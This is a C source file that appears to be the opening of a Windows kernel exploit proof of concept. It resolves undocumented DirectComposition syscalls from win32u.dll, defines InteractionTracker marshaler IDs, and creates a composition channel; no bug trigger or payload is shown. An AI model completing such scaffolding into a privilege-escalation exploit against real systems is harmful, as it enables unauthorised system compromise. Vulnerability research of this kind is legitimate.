#include <stdio.h>
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS(*pNtDCompositionCreateChannel)(
    OUT PHANDLE pArgChannelHandle,
    IN OUT PSIZE_T pArgSectionSize,
    OUT PVOID* pArgSectionBaseMapInProcess
    );

typedef NTSTATUS(*pNtDCompositionProcessChannelBatchBuffer)(
    IN HANDLE hChannel,
    IN DWORD dwArgStart,
    OUT PDWORD pOutArg1,
    OUT PDWORD pOutArg2
    );

typedef NTSTATUS(*pNtDCompositionCommitChannel)(
    IN HANDLE pArgChannelHandle,
    OUT LPDWORD out1,
    OUT LPBOOL out2,
    IN BOOL in1,
    IN HANDLE in2
    );


#define nCmdCreateResource 0x1
#define nCmdReleaseResource 0x3
#define nCmdSetBufferProperty 0xC
#define CInteractionTrackerBindingManagerMarshaler 0x59
#define CInteractionTrackerMarshaler 0x58

HANDLE hChannel;
PVOID pMappedAddress = NULL;  SIZE_T SectionSize = 0x4000;
DWORD dwArg1, dwArg2;
DWORD szBuff[0x400];

#define TrackerBinding1 1
#define TrackerBinding2 2
#define Tracker 3

pNtDCompositionCreateChannel NtDCompositionCreateChannel;
pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
pNtDCompositionCommitChannel NtDCompositionCommitChannel;

int main(int argc, TCHAR* argv[])
{

    LoadLibrary(L"user32.dll");
    NTSTATUS ntStatus;
    HMODULE win32u = LoadLibrary(L"win32u.dll");
    NtDCompositionCreateChannel = (pNtDCompositionCreateChannel)GetProcAddress(win32u, "NtDCompositionCreateChannel");
    NtDCompositionProcessChannelBatchBuffer = (pNtDCompositionProcessChannelBatchBuffer)GetProcAddress(win32u, "NtDCompositionProcessChannelBatchBuffer");
    NtDCompositionCommitChannel = (pNtDCompositionCommitChannel)GetProcAddress(win32u, "NtDCompositionCommitChannel");

    printf("[+] Create New Direct Composition Channel\n");
    ntStatus = NtDCompositionCreateChannel(&hChannel, &SectionSize, &pMappedAddress);
    if (!NT_SUCCESS(ntStatus)) {
        printf("[-] Fail to create Direct Composition Channel\n");
        exit(-1);
    }

    printf("[*] Create channel ok, channel=0x%x\n", hChannel);

}